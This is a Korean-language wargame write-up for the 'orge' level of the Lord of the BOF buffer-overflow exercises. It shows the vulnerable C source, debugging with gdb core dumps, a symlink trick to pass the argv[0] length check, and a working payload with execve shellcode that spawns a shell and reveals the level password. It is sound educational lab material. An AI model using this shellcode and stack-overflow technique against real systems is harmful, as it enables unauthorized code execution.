# orge

```c
[darkelf@localhost darkelf]$ cat orge.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orge
        - check argv[0]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // here is changed!
        if(strlen(argv[0]) != 77){
                printf("argv[0] error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```

darkelf에 argv[0]의 길이를 확인하는 조건이 추가된 문제이다.

단순하게 생각해보면 실행하고 나서 실행조건인 인자를 바꿀 순 없으니 실행전에 cat으로 인자를 넘겨주면 77개를 넘겨줄 수 있을 것 같아서 먼저 테스트 해봤다.

```bash
[darkelf@localhost darkelf]$ ./orge a
argv[0] error
[darkelf@localhost darkelf]$ (python -c 'print "\x90"*77';cat)|./orge
argv error
[darkelf@localhost darkelf]$ (python -c 'print "\x90"*77';cat)|./orge a
argv[0] error
```

별 소용 없는 것 같다. 

찾아보니 rename, 이름을 '/' 로 채우기, 심볼릭 링크 걸기 등의 방법이 있는 듯 했다. 

그 중에서 제일 의도된 거 같은 느낌의 심볼릭 링크로 문제를 해결해보자.

일단 먼저 파일에 대해서 테스트를 할 복제 파일을 만든다. 

```bash
[darkelf@localhost darkelf]$ cp orge `python -c 'print "a"*75'`
[darkelf@localhost darkelf]$ ls
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  orge  orge.c
```

복제한 파일에 대해서 다른 조건에 맞추어 공격 코드를 짜고 ret부분만 임의로 작성한다.(여러번 했으니 설명없이 넘어가자)

```bash
[darkelf@localhost darkelf]$ ./aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  `python -c 'print "\x90"*44+"\x1c\xfc\xff\xbf"+" "+"\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
Segmentation fault (core dumped)
```

뭔가 dump된 걸보니 다른 조건은 제대로 들어간 듯하다. 이제 core를 뜯어서 ret주소로 할 argv[2]의 위치를 파악해본다.

```bash
[darkelf@localhost darkelf]$ gdb -c core -q
Core was generated by `./aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ▒'.
Program terminated with signal 11, Segmentation fault.
#0  0xbffffffb in ?? ()
(gdb) x/100x $esp
0xbfffff60:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffff70:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffff80:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffff90:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffffa0:     0x00000000      0x00000000      0x00000000      0x2f2e0000
0xbfffffb0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbfffffc0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbfffffd0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbfffffe0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffffff0:     0x61616161      0x61616161      0x00616161      0x00000000
0xc0000000:     Cannot access memory at address 0xc0000000
(gdb) x/100x $esp
0xbfffff60:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffff70:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffff80:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffff90:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffffa0:     0x00000000      0x00000000      0x00000000      0x2f2e0000
0xbfffffb0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbfffffc0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbfffffd0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbfffffe0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffffff0:     0x61616161      0x61616161      0x00616161      0x00000000
0xc0000000:     Cannot access memory at address 0xc0000000
```

안된다. 뭔가 잘 못 됐는데 아마 ret부분을 잘 못 준게 아닐까해서 다르게 줘봤다.

```bash
[darkelf@localhost darkelf]$ ./aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  `python -c 'print "\x90"*44+"\x1c\xcc\xff\xbf"+" "+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
Segmentation fault (core dumped)
[darkelf@localhost darkelf]$ gdb -c core -q
Core was generated by `./aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ▒'.
Program terminated with signal 11, Segmentation fault.
#0  0xbfffcc1c in ?? ()
(gdb) x/100x $esp
0xbffff980:     0x00000000      0xbffff9c4      0xbffff9d4      0x40013868
0xbffff990:     0x00000003      0x08048450      0x00000000      0x08048471
0xbffff9a0:     0x08048500      0x00000003      0xbffff9c4      0x08048390
0xbffff9b0:     0x0804866c      0x4000ae60      0xbffff9bc      0x40013e90
0xbffff9c0:     0x00000003      0xbffffacc      0xbffffb1a      0xbffffb4b
0xbffff9d0:     0x00000000      0xbffffbcf      0xbffffbe1      0xbffffbf9
0xbffff9e0:     0xbffffc18      0xbffffc3a      0xbffffc47      0xbffffe0a
0xbffff9f0:     0xbffffe29      0xbffffe46      0xbffffe5b      0xbffffe7a
0xbffffa00:     0xbffffe85      0xbffffe95      0xbffffe9d      0xbffffea7
0xbffffa10:     0xbffffeb7      0xbffffec5      0xbffffed3      0xbffffee4
0xbffffa20:     0xbffffeef      0xbfffff02      0xbfffff45      0xbfffff95
0xbffffa30:     0x00000000      0x00000003      0x08048034      0x00000004
0xbffffa40:     0x00000020      0x00000005      0x00000006      0x00000006
0xbffffa50:     0x00001000      0x00000007      0x40000000      0x00000008
0xbffffa60:     0x00000000      0x00000009      0x08048450      0x0000000b
0xbffffa70:     0x000001fa      0x0000000c      0x000001fa      0x0000000d
0xbffffa80:     0x000001fa      0x0000000e      0x000001fa      0x00000010
0xbffffa90:     0x0fabfbff      0x0000000f      0xbffffac7      0x00000000
0xbffffaa0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffab0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffac0:     0x00000000      0x69000000      0x00363836      0x61612f2e
0xbffffad0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffffae0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffffaf0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffffb00:     0x61616161      0x61616161      0x61616161      0x61616161
(gdb)
0xbffffb10:     0x61616161      0x61616161      0x90900061      0x90909090
0xbffffb20:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffb30:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffb40:     0x90909090      0xcc1c9090      0x9000bfff      0x90909090
0xbffffb50:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffb60:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffb70:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffb80:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffb90:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffba0:     0x90909090      0x90909090      0x90909090      0x31909090
0xbffffbb0:     0x2f6850c0      0x6868732f      0x6e69622f      0x5350e389
0xbffffbc0:     0xc289e189      0x80cd0bb0      0x01b0c031      0x000080cd
0xbffffbd0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffbe0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffbf0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc00:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc10:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc20:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc30:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc40:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc50:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc60:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc70:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc80:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc90:     0x00000000      0x00000000      0x00000000      0x00000000
```

제대로 나오는 것을 보니 역시 ret부분의 문제였다. (라고 쉬운듯이 썼지만 거의 한시간을 해맸다)

중간에 ret으로 준 0xbffffccc1 다음 부분이 argv[2]인데 어차피 오차가 발생할 수 있어 NOP sled를 쓰고 있으므로 적당히 다음 위치인 0xbffffb50을 ret주소로 주고 공격해보자.

일단 공격을 위해서 링크 파일을 생성해준다. 링크 파일은 아래와 같이 만들 수 있다.

```bash
ln -s [원본파일] [링크파일]
```

링크를 만들어서 이름을 77자로 만들어야 일단 실행이 가능해진다.  여기서 실행하려면 './'을 붙여야 하므로 2자리를 뺀 75자를 이름으로 채워서 링크 파일을 만든다. (여기서도 python사용이 가능하다)

```bash
[darkelf@localhost darkelf]$ ln -s orge `python -c 'print "b"*75'`
[darkelf@localhost darkelf]$ ls
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  core  orge.c
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb  orge
```

만든 링크 파일을 통해 공격 코드로 공격을 했더니 깔끔하게 성공했다.(허무하다.. 겁나 머리 썼는데 링크문제..)

````bash
[darkelf@localhost darkelf]$ ./bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb `python -c 'print "\x90"*44+"\x50\xfb\xff\xbf"+" "+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒P▒▒▒
bash$ whoami
orge
bash$ my-pass
euid = 507
timewalker
````

orge의 password는 timewalker이다.